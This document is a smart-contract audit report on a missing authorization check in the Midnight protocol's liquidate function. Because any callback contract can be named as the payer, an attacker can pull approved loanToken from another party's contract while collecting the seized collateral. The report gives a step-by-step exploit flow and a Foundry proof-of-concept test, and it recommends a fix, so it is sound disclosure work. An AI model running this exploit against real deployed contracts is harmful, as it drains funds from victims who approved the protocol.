Audit Report

## Title
Missing authorization check on `callback` parameter allows arbitrary third-party payer designation - (File: src/Midnight.sol)

## Summary
`Midnight.liquidate` unconditionally sets `payer = callback` when `callback != address(0)` at line 679, with no requirement that `callback == msg.sender` or that `callback` has authorized `msg.sender`. An attacker can designate any deployed flash-liquidation contract that implements `ILiquidateCallback`, returns `CALLBACK_SUCCESS`, and holds a loanToken approval to Midnight as the payer, causing the protocol to pull `repaidUnits` of loanToken from that victim contract while the attacker's `receiver` address collects the seized collateral at zero personal cost.

## Finding Description

**Exact code path:**

`src/Midnight.sol` line 679:
```solidity
address payer = callback != address(0) ? callback : msg.sender;
``` [1](#0-0) 

`src/Midnight.sol` lines 696–717:
```solidity
SafeTransferLib.safeTransfer(market.collateralParams[collateralIndex].token, receiver, seizedAssets);
if (callback != address(0)) {
    require(
        ILiquidateCallback(callback).onLiquidate(msg.sender, ...) == CALLBACK_SUCCESS,
        WrongLiquidateCallbackReturnValue()
    );
}
SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), repaidUnits);
``` [2](#0-1) 

**Root cause:** No check of the form `require(callback == msg.sender || isAuthorized[callback][msg.sender])` exists anywhere in `liquidate`. The only gate on `callback` is that it must return `CALLBACK_SUCCESS` from `onLiquidate`, which is satisfied by any conforming callback contract regardless of who invoked `liquidate`. The `isAuthorized` mapping is consulted in `setConsumed` (line 724) and `setIsAuthorized` (line 732) but is never consulted in `liquidate` for the `callback` parameter. [3](#0-2) 

**Exploit flow:**
1. Precondition: `victimContract` has called `loanToken.approve(midnight, N)` and its `onLiquidate` checks only `msg.sender == midnight` (returning `CALLBACK_SUCCESS` without verifying `receiver == address(this)`).
2. Attacker calls `midnight.liquidate(market, idx, 0, repaidUnits, borrower, false, attackerEOA, victimContract, data)`.
3. `payer = victimContract` (line 679).
4. `seizedAssets` of collateral transferred to `attackerEOA` (line 696).
5. `victimContract.onLiquidate(attacker, ...)` called — returns `CALLBACK_SUCCESS` because `msg.sender == midnight` (lines 700–714).
6. `safeTransferFrom(loanToken, victimContract, midnight, repaidUnits)` executes (line 717) — pulls from victim.
7. Net: attacker receives collateral worth `repaidUnits × LIF`, pays nothing; victim loses `repaidUnits` of loanToken.

**Why existing checks fail:**
- The `liquidatorGate` check (line 598) gates who can call `liquidate`, not what `callback` is. [4](#0-3) 
- The Certora spec `otherEntryPointsOnlyPullFromCaller` (line 128) sets `liquidateCallbackAllowed = true` unconditionally for any address passed as callback to `liquidate`. It proves only the weaker property "tokens only leave from a callback that returned `CALLBACK_SUCCESS`," not "callback must be `msg.sender` or authorized by `msg.sender`." [5](#0-4) 
- The `isAuthorized` mapping is used in `setConsumed` and `setIsAuthorized` but is never consulted in `liquidate` for the `callback` parameter. [6](#0-5) 

## Impact Explanation
Any contract that (a) implements `ILiquidateCallback` returning `CALLBACK_SUCCESS` and (b) holds a loanToken approval to Midnight can have its entire approved balance drained by an unprivileged attacker in a single `liquidate` call. The attacker receives seized collateral at zero personal cost. This directly violates the protocol invariant that liquidation must not transfer assets from unauthorized parties, and constitutes unauthorized token loss for the victim.

## Likelihood Explanation
Preconditions are routinely satisfied in production: (1) unhealthy or post-maturity borrowers exist as a normal market condition; (2) deployed flash-liquidation bots and callback contracts pre-approve Midnight for loanToken to enable the pull after `onLiquidate`, and many check only `msg.sender == midnight` without validating that the collateral receiver is themselves or that the liquidation is profitable for them. The attacker requires no special privilege, no oracle manipulation, and no governance access. The attack is repeatable as long as the victim's approval persists.

## Recommendation
Add an authorization check on the `callback` parameter in `liquidate`, analogous to the `isAuthorized` pattern used elsewhere in the protocol:

```solidity
require(
    callback == address(0) || callback == msg.sender || isAuthorized[callback][msg.sender],
    Unauthorized()
);
```

This ensures that only the liquidator itself or a contract that has explicitly authorized the liquidator can be designated as the payer, preventing arbitrary third-party payer designation.

## Proof of Concept

**Minimal Foundry test:**

```solidity
contract VictimCallback is ILiquidateCallback {
    ERC20 loanToken;
    address midnight;

    constructor(ERC20 _loanToken, address _midnight) {
        loanToken = _loanToken;
        midnight = _midnight;
        // Pre-approve Midnight for loanToken (standard flash-liquidation setup)
        loanToken.approve(_midnight, type(uint256).max);
    }

    function onLiquidate(
        address, bytes32, Market memory, uint256, uint256, uint256,
        address, address, bytes memory, uint256
    ) external returns (bytes32) {
        // Only checks msg.sender == midnight, does NOT check receiver == address(this)
        require(msg.sender == midnight, "not midnight");
        return CALLBACK_SUCCESS;
    }
}

function testArbitraryPayerExploit() public {
    // Setup: borrower is liquidatable
    // VictimCallback holds loanToken and has approved Midnight
    VictimCallback victim = new VictimCallback(loanToken, address(midnight));
    deal(address(loanToken), address(victim), repaidUnits);

    address attacker = makeAddr("attacker");
    uint256 attackerCollateralBefore = collateralToken.balanceOf(attacker);
    uint256 victimLoanBefore = loanToken.balanceOf(address(victim));

    vm.prank(attacker);
    midnight.liquidate(market, 0, 0, repaidUnits, borrower, true, attacker, address(victim), "");

    // Attacker received collateral, victim lost loanToken
    assertGt(collateralToken.balanceOf(attacker), attackerCollateralBefore);
    assertEq(loanToken.balanceOf(address(victim)), victimLoanBefore - repaidUnits);
}
```
